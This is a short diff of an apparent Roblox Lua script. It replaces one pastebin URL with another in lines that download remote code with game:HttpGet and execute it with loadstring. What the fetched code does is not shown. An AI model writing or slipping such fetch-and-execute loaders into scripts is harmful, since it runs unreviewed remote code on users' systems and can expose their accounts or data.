@@ -19,7 +19,7 @@ UIManager.BuildAndShowUIPrompt({
 loadstring(game:HttpGet("https://pastebin.com/raw/88aTLHny"))()
  --LOGS--
 --BTKDG--
-loadstring(game:HttpGet("https://pastebin.com/raw/KSLKsMA8"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/8bDuQfnp"))()
 --BTKDG--
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
